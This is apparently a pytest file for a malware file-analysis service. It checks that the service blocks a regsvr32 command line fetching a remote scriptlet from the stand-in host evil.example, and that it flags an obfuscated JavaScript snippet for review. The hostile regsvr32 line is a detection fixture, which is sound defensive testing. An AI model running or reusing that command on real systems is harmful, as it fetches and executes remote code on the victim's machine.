import io
import sys
from pathlib import Path

import pytest
from starlette.datastructures import UploadFile

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from backend.services.alerts_service import AlertsService
from backend.services.file_analysis_service import FileAnalysisService


class FakeSession:
    def add(self, obj):
        return None

    def commit(self):
        return None

    def refresh(self, obj):
        return None


def _service() -> FileAnalysisService:
    try:
        return FileAnalysisService.get_instance()
    except RuntimeError:
        models_store = ROOT / "backend" / "data" / "models_store"
        yara_rules = ROOT / "backend" / "yara_rules" / "basic_rules.yar"
        return FileAnalysisService(
            ml_model_path=str(models_store / "file_analyzer_v1.joblib"),
            yara_rules_path=str(yara_rules),
            alerts_service=AlertsService(),
        )


@pytest.mark.asyncio
async def test_lolbas_regsvr32_remote_scriptlet_blocks():
    svc = _service()
    payload = b"regsvr32 /s /n /u /i:https://evil.example/payload.sct scrobj.dll"
    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename="cmdline.txt"),
    )

    overall = result["overall_assessment"]
    malware = result["file_details"]["malware_scan"]
    details = malware.get("scan_details") or {}

    assert malware["is_malicious"] is True
    assert overall["recommended_action"] == "BLOCK_AND_QUARANTINE"
    assert "outer_yara_matches" in details
    assert "lolbas_regsvr32_remote_scriptlet_2026" in details["outer_yara_matches"]


@pytest.mark.asyncio
async def test_js_obfuscation_is_flagged_suspicious_not_blocked():
    svc = _service()
    payload = (
        b"var a0_0x12=['x'];\n"
        b"while(!![]){break;}\n"
        b"obj['atob']=function(v){return v;};\n"
        b"return!![];\n"
    )
    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename="script.js"),
    )

    overall = result["overall_assessment"]
    malware = result["file_details"]["malware_scan"]
    details = malware.get("scan_details") or {}

    assert malware["is_malicious"] is False
    assert overall["recommended_action"] == "FLAG_FOR_REVIEW"
    assert "Suspicious" in overall["overall_status"]
    assert "suspicious_yara_matches" in details
    assert "suspicious_js_obfuscatorio_structure_2026" in details["suspicious_yara_matches"]
